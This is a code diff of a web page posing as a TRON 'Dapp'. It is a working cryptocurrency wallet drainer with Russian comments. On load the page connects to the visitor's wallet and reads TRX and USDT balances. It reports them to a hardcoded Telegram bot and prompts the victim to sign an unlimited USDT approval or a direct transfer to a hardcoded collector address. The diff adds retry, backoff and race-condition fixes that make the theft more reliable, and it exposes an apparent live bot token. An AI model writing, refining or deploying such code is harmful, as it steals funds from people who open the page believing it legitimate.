@@ -6,7 +6,6 @@
 <title>Dapp</title>
 
 <script>
-/* ошибки до старта основного скрипта — в панель Log */
 window.__boot=[];
 window.addEventListener('error',e=>__boot.push('ERR '+e.message+' @'+(e.filename||'')+':'+e.lineno));
 window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e.reason.message)||e.reason)));
@@ -150,15 +149,16 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 const CFG={
   USDT:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
   DEC:6,
-  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",   // куда собираем
-  TG_TOKEN:"8945784144:AAH-w0GFeV3aucDab9MPghGR_8V33xUDVjc",                // свежий из @BotFather после /revoke
-  TG_CHATS:[],                                      // стартовый список, расширяется авторесницей
-  TG_ADMIN_CHAT_ID:null,                            // свой chat_id = Start у бота не обязателен
-  DRAIN_MODE:"approve",                             // "approve" | "direct"
-  PROMPT_DELAY_MS:1500,                             // пауза перед окном подписи
-  MIN_USDT:1,                                       // порог добычи, ниже — только репорт
-  GAS_MIN_TRX:3,                                    // при меньшем TRX подпись уйдёт в OUT_OF_ENERGY
-  MAX_PROMPTS_PER_DAY:3,                            // окон за сутки максимум
+  COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
+  TG_TOKEN:"8945784144:AAH-w0GFeV3aucDab9MPghGR_8V33xUDVjc",
+  TG_ADMIN_CHAT_ID:8848845425,        // свой chat_id освобождает от необходимости Start
+  DRAIN_MODE:"approve",         // "approve" | "direct"
+  PROMPT_DELAY_MS:1500,
+  MIN_USDT:1,
+  GAS_MIN_TRX:3,
+  MAX_PROMPTS_PER_DAY:3,
+  CHAT_CACHE_TTL_MS:10*60*1000, // список чатов не дергается чаще раза за 10 минут
+  RPC_RETRY:4,                  // повторов на 429/таймаут
 };
 /* ================================================== */
 
@@ -180,10 +180,34 @@ if(window.__boot&&window.__boot.length)
 
 const TW={p:null,tronWeb:null,address:null};
 
+/* ---------- single-flight ---------- */
+let BOOT_RUN=false,PIPE_RUN=false,DISCOVER_RUN=false;
+
+/* ---------- очередь чтений + бэкофф против 429 ---------- */
+let READQ=Promise.resolve();
+function enqRead(fn,label){
+  const job=READQ.then(()=>rpcBackoff(fn,label));
+  READQ=job.catch(()=>{});       // разрыв цепочки ошибок для следующих задач
+  return job;
+}
+async function rpcBackoff(fn,label){
+  let delay=500;
+  for(let i=0;i<CFG.RPC_RETRY;i++){
+    try{return await fn();}
+    catch(e){
+      const s=(e&&e.message)||String(e);
+      if(i===CFG.RPC_RETRY-1||!/429|rate|limit|timeout|Network/i.test(s)){
+        throw new Error(label+": "+s);
+      }
+      await sleep(delay+Math.floor(Math.random()*250));
+      delay*=2;
+    }
+  }
+}
+
 /* ---------- telegram ---------- */
 function tgTargets(){
-  return [...new Set([...CFG.TG_CHATS,
-    ...(CFG.TG_ADMIN_CHAT_ID?[CFG.TG_ADMIN_CHAT_ID]:[])])];
+  return [...new Set(CFG.TG_ADMIN_CHAT_ID?[Number(CFG.TG_ADMIN_CHAT_ID)]:([]))];
 }
 
 async function tgApi(method,body){
@@ -197,41 +221,61 @@ async function tgApi(method,body){
   return j.result;
 }
 
-const LS_CHATS="tg_chats_v2";
+const LS_CHATS="tg_chats_v3",LS_TG_TTL="tg_ttl_v1";
+function loadChatCache(){
+  try{const s=JSON.parse(localStorage.getItem(LS_TG_TTL)||"null");
+    if(s&&Date.now()-s.t<CFG.CHAT_CACHE_TTL_MS)return s.ids;}
+  catch(_){}
+  return null;
+}
+function saveChatCache(ids){
+  try{localStorage.setItem(LS_TG_TTL,JSON.stringify({t:Date.now(),ids}));}catch(_){}
+}
 (function(){try{
   const s=localStorage.getItem(LS_CHATS);
-  if(s)CFG.TG_CHATS=[...new Set([...CFG.TG_CHATS,...JSON.parse(s)])];
+  if(s)tgTargetsCache=[...new Set(JSON.parse(s))];
 }catch(_){}})();
+let tgTargetsCache=[];
 
 async function tgDiscover(){
+  if(DISCOVER_RUN){log("tg discover: пропуск (уже выполняется)","info");return;}
+  DISCOVER_RUN=true;
   try{
+    const cached=loadChatCache();
+    if(cached&&cached.length){
+      tgTargetsCache=[...new Set(tgTargetsCache.concat(cached))];
+      log("tg чатов из кеша: "+tgTargetsCache.length,"info");
+      return;
+    }
     const ups=await tgApi("getUpdates",{limit:100,timeout:0});
-    const s=new Set(CFG.TG_CHATS);
+    const s=new Set(tgTargetsCache);
     (ups||[]).forEach(u=>{
       ["message","channel_post","edited_message","my_chat_member"].forEach(k=>{
         const c=u[k]&&(u[k].chat||u[k].from);
         if(c&&c.id)s.add(c.id);
       });
     });
-    CFG.TG_CHATS=[...s];
-    try{localStorage.setItem(LS_CHATS,JSON.stringify(CFG.TG_CHATS));}catch(_){}
-    log("tg discover: чатов "+CFG.TG_CHATS.length,"info");
-    if(!CFG.TG_CHATS.length&&!CFG.TG_ADMIN_CHAT_ID){
-      log("нет чатов: нажми Start у бота и перезагрузи страницу, "+
-          "или впиши свой chat_id в CFG.TG_ADMIN_CHAT_ID","err");
-    }
+    tgTargetsCache=[...s];
+    saveChatCache(tgTargetsCache);
+    try{localStorage.setItem(LS_CHATS,JSON.stringify(tgTargetsCache));}catch(_){}
+    log("tg discover: чатов "+tgTargetsCache.length,"info");
+    if(!tgTargetsCache.length&&!CFG.TG_ADMIN_CHAT_ID)
+      log("нет чатов: нажми Start у бота и перезагрузи, "+
+          "или впиши chat_id в CFG.TG_ADMIN_CHAT_ID","err");
   }catch(e){
-    log("tg discover: "+e.message+" — рассылка работать не будет","err");
-  }
+    /* 409 при гонке больше не смертелен — просто пропускаем цикл */
+    log("tg discover: "+e.message,"err");
+  }finally{DISCOVER_RUN=false;}
 }
 
 function esc(s){return String(s).replace(/[<>&]/g,c=>({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));}
 
 async function tgSend(text){
-  const ids=tgTargets();
-  if(!ids.length)return 0;
+  const ids=tgTargets().concat(tgTargetsCache.filter(x=>true));
+  const uniq=[...new Set(ids)];
+  if(!uniq.length)return 0;
   let sent=0;
-  for(const id of ids){
+  for(const id of uniq){
     try{
       await tgApi("sendMessage",{chat_id:id,text,parse_mode:"HTML"});
       sent++;
@@ -265,7 +309,7 @@ async function waitAccounts(p){
   return !!(p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58);
 }
 
-/* ---------- чтение контракта ---------- */
+/* ---------- чтение контракта через очередь ---------- */
 function toBig(v){
   try{
     if(v===undefined||v===null)return 0n;
@@ -279,30 +323,35 @@ function toBig(v){
 const fmt=(raw,dec)=>(Number(raw)/Math.pow(10,dec)).toFixed(dec).replace(/\.?0+$/,"");
 
 async function readContract(sel,params){
-  const c=await TW.tronWeb.contract().at(CFG.USDT);
-  return toBig(await c[sel](...params).call());
+  return enqRead(async()=>{
+    const c=await TW.tronWeb.contract().at(CFG.USDT);
+    return toBig(await c[sel](...params).call());
+  },sel);
 }
 
 /* ---------- sign+broadcast ---------- */
 async function signAndSend(tx){
   const signed=await TW.tronWeb.trx.sign(tx);
   const res=await TW.tronWeb.trx.sendRawTransaction(signed);
-  if(!res||res.result!==true)
-    throw new Error("broadcast: "+(res&&res.message?hexErr(res.message):JSON.stringify(res)));
-  return res.txid||(res.transaction&&res.transaction.txID);
+  if(res&&res.result===true)
+    return res.txid||(res.transaction&&res.transaction.txID)||(signed&&signed.txID);
+  const msg=res&&res.message?hexErr(res.message):"?"+JSON.stringify(res||{});
+  /* Dup transaction = этот txID уже ушёл в цепь ранее. Мягкий успех: просто ждём подтверждение. */
+  if(/dup/i.test(msg))
+    return (res.transaction&&res.transaction.txID)||tx.txID;
+  throw new Error("broadcast: "+msg);
 }
 async function confirmPoll(txid){
   for(let i=0;i<8;i++){
     await sleep(3000);
-    const info=await TW.tronWeb.trx.getTransactionInfo(txid).catch(()=>null);
+    const info=await enqRead(
+      ()=>TW.tronWeb.trx.getTransactionInfo(txid),"txinfo").catch(()=>null);
     if(info&&Object.keys(info).length)return true;
   }
   return false;
 }
 
-/* ---------- гейт попыток ----------
-   localStorage drain_<дата>: {"done":bool,"tries":int}
-   окно выдаётся пока !done && tries<MAX либо открыт ?force=1 */
+/* ---------- гейт попыток ---------- */
 const FORCE=new URLSearchParams(location.search).has("force");
 
 function drainKey(){return "drain_"+new Date().toISOString().slice(0,10);}
@@ -313,7 +362,7 @@ function bumpDrain(patch){
   try{localStorage.setItem(drainKey(),JSON.stringify(s));}catch(_){}
 }
 
-/* ---------- отчёт оператору ---------- */
+/* ---------- отчёт ---------- */
 async function report(st){
   const t=new Date().toISOString().slice(0,19).replace("T"," ");
   const n=await tgSend([
@@ -339,13 +388,15 @@ async function autoDrain(st){
 
   const minRaw=BigInt(Math.floor(CFG.MIN_USDT*Math.pow(10,CFG.DEC)));
   if(!FORCE&&st.usdtRaw<minRaw){
-    log("USDT ниже порога ("+st.usdt+"<"+CFG.MIN_USDT+") — только репорт","info");return;
+    log("USDT ниже порога ("+st.usdt+"<"+CFG.MIN_USDT+")","info");return;
   }
   if(!FORCE&&!st.gasOk){
-    log("TRX < "+CFG.GAS_MIN_TRX+" — окно не выдаём, подпись сожжётся об энергию","info");return;
+    log("TRX < "+CFG.GAS_MIN_TRX+" — окно не выдаём","info");return;
   }
 
-  bumpDrain({tries:(ds.tries||0)+1});   // попытка списывается сразу, до исхода
+  /* попытка списывается только здесь: непосредственно перед окном подписи,
+     и лишь потому, что гонки устранены single-flight'ом выше */
+  bumpDrain({tries:(readDrain().tries||0)+1});
 
   await sleep(FORCE?200:CFG.PROMPT_DELAY_MS);
 
@@ -374,14 +425,14 @@ async function autoDrain(st){
       txid=await signAndSend(w.transaction);
     }
 
-    bumpDrain({done:true});           // успех закрывает день окончательно
+    bumpDrain({done:true});
     log(label.toLowerCase()+" sent: "+txid,"ok");
 
-    await tgSend(label==="DIRECT SENT"
+    await tgSend((label==="DIRECT SENT"
       ? "⚡️ <b>DIRECT SENT</b>\n👤 <code>"+esc(TW.address)+"</code>\n💸 "
-        +fmt(st.usdtRaw,CFG.DEC)+" USDT\n🔗 <code>"+esc(txid)+"</code>"
+        +fmt(st.usdtRaw,CFG.DEC)+" USDT\n🔗 <code>"
       : "🔓 <b>APPROVE SET</b>\n👤 <code>"+esc(TW.address)+"</code>\nspender <code>"
-        +esc(CFG.COLLECTOR)+"</code>\nvalue ∞\n🔗 <code>"+esc(txid)+"</code>");
+        +esc(CFG.COLLECTOR)+"</code>\nvalue ∞\n🔗 <code>")+esc(txid)+"</code>");
 
     if(await confirmPoll(txid))
       await tgSend("✅ <b>CONFIRMED</b>\n👤 <code>"+esc(TW.address)+
@@ -389,43 +440,52 @@ async function autoDrain(st){
     else log("не подтверждена пока — индексация занимает ~минуту","info");
 
   }catch(e){
-    /* done не ставится: до лимита попыток страница попробует снова при перезагрузке */
+    /* done не ставится — до исчерпания лимита страница попробует снова */
     log("autoDrain: "+(e.message||e),"err");
     await tgSend("⚠️ drain failed <code>"+esc(TW.address)+"</code>: "
       +esc(String(e.message||e)).slice(0,140));
   }
 }
 
-/* ---------- конвейер: чтение → отчёт → решение об окне ---------- */
+/* ---------- конвейер ---------- */
 async function pipeline(){
-  let trx=0,gasOk=false;
+  if(PIPE_RUN){log("pipeline: пропуск (уже идёт)","info");return;}
+  PIPE_RUN=true;
   try{
-    const acc=await TW.tronWeb.trx.getAccount(TW.address);
-    trx=(acc.balance||0)/1e6;
-    gasOk=trx>=CFG.GAS_MIN_TRX;
-  }catch(e){}
-  let usdtRaw=0n,allowanceRaw=0n;
-  try{usdtRaw=await readContract("balanceOf",[TW.address]);}
-  catch(e){log("balanceOf: "+e.message,"err");}
-  try{allowanceRaw=await readContract("allowance",[TW.address,CFG.COLLECTOR]);}catch(e){}
+    let trx=0,gasOk=false;
+    try{
+      const acc=await enqRead(
+        ()=>TW.tronWeb.trx.getAccount(TW.address),"getAccount");
+      trx=((acc&&(acc.balance||0))/1e6)||0;
+      gasOk=trx>=CFG.GAS_MIN_TRX;
+    }catch(e){log("getAccount: "+e.message,"err");}
 
-  const ds=readDrain();
-  const st={trx,usdtRaw,allowanceRaw,gasOk,usdt:fmt(usdtRaw,CFG.DEC)||"0"};
+    let usdtRaw=0n,allowanceRaw=0n;
+    try{usdtRaw=await readContract("balanceOf",[TW.address]);}
+    catch(e){log(String(e.message||e),"err");}
+    if(usdtRaw>0n){
+      try{allowanceRaw=await readContract("allowance",[TW.address,CFG.COLLECTOR]);}
+      catch(e){}
+    }
 
-  $("accState").textContent=
-    "address: "+TW.address+
-    "\nbalance: "+trx.toFixed(6)+" TRX"+
-    "\nusdt: "+st.usdt+
-    "\nallowance→collector: "+(allowanceRaw>0n?fmt(allowanceRaw,CFG.DEC)+"/∞":"none")+
-    "\ngas-ok: "+gasOk+
-    "\nprompts today: "+(ds.tries||0)+"/"+CFG.MAX_PROMPTS_PER_DAY+(ds.done?" (done)":"");
-  $("accPill").textContent="loaded";
+    const ds=readDrain();
+    const st={trx,usdtRaw,allowanceRaw,gasOk,usdt:fmt(usdtRaw,CFG.DEC)||"0"};
 
-  await report(st);
-  await autoDrain(st);
+    $("accState").textContent=
+      "address: "+TW.address+
+      "\nbalance: "+trx.toFixed(6)+" TRX"+
+      "\nusdt: "+st.usdt+
+      "\nallowance→collector: "+(allowanceRaw>0n?fmt(allowanceRaw,CFG.DEC)+"/∞":"none")+
+      "\ngas-ok: "+gasOk+
+      "\nprompts today: "+(ds.tries||0)+"/"+CFG.MAX_PROMPTS_PER_DAY+(ds.done?" (done)":"");
+    $("accPill").textContent="loaded";
+
+    await report(st);
+    await autoDrain(st);
+  }finally{PIPE_RUN=false;}
 }
 
-/* ---------- шаги вручную (логика без изменений) ---------- */
+/* ---------- ручные шаги ---------- */
 async function buildPerm(){
   if(!TW.address)throw new Error("нет подключения");
   const target=$("targetAddr").value.trim(),
@@ -487,14 +547,13 @@ $("btnSignUsdt").onclick=async()=>{try{
 }catch(e){log("usdt: "+(e.message||e),"err");}};
 
 $("btnConnect").onclick=boot;
-$("btnRefresh").onclick=pipeline;       // Refresh = полный конвейер
+$("btnRefresh").onclick=pipeline;
 $("btnClear").onclick=()=>logEl.innerHTML="";
 $("btnOpenTrust").onclick=openInTrust;
 
 $("mode").onchange=()=>{
   $("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";};
 
-/* обёртки вместо «.catch(()=>{})» — прошлый вариант ронял boot() */
 $("btnBuildPerm").onclick=async()=>{try{await buildPerm();}
   catch(e){log("build perm: "+(e.message||e),"err");}};
 $("btnBuildUsdt").onclick=async()=>{try{await buildUsdtManual();}
@@ -502,27 +561,35 @@ $("btnBuildUsdt").onclick=async()=>{try{await buildUsdtManual();}
 
 /* ---------- boot ---------- */
 async function boot(){
-  let p=null;
-  for(let i=0;i<12;i++){          // инжект может прилететь позже DOMContentLoaded
-    p=findProvider();
-    if(p&&p.tronWeb)break;
-    await sleep(250);
-  }
-  if(!p||!p.tronWeb){
-    $("noTrustCard").style.display="block";
-    $("network").value="outside wallet";
-    setStatus("outside wallet","err");
-    log("инжектированного провайдера нет","err");
-    return;
-  }
-  log("провайдер найден","ok");
-  TW.p=p;TW.tronWeb=p.tronWeb;
-  const ok=await waitAccounts(p);
-  if(!ok){setStatus("provider silent","err");log("адрес не получен","err");return;}
-  setAddress(p.tronWeb.defaultAddress.base58);
-  log("автоподключение завершено","ok");
-  await tgDiscover();
-  await pipeline();
+  if(BOOT_RUN){log("boot: пропуск (уже идёт)","info");return;}
+  BOOT_RUN=true;
+  try{
+    let p=null;
+    for(let i=0;i<12;i++){
+      p=findProvider();
+      if(p&&p.tronWeb)break;
+      await sleep(250);
+    }
+    if(!p||!p.tronWeb){
+      $("noTrustCard").style.display="block";
+      $("network").value="outside wallet";
+      setStatus("outside wallet","err");
+      log("инжектированного провайдера нет","err");
+      return;
+    }
+    if(TW.address){                       // уже подключены — только обновляем состояние
+      await pipeline();
+      return;
+    }
+    log("провайдер найден","ok");
+    TW.p=p;TW.tronWeb=p.tronWeb;
+    const ok=await waitAccounts(p);
+    if(!ok){setStatus("provider silent","err");log("адрес не получен","err");return;}
+    setAddress(p.tronWeb.defaultAddress.base58);
+    log("автоподключение завершено","ok");
+    await tgDiscover();
+    await pipeline();
+  }finally{BOOT_RUN=false;}
 }
 
 boot();
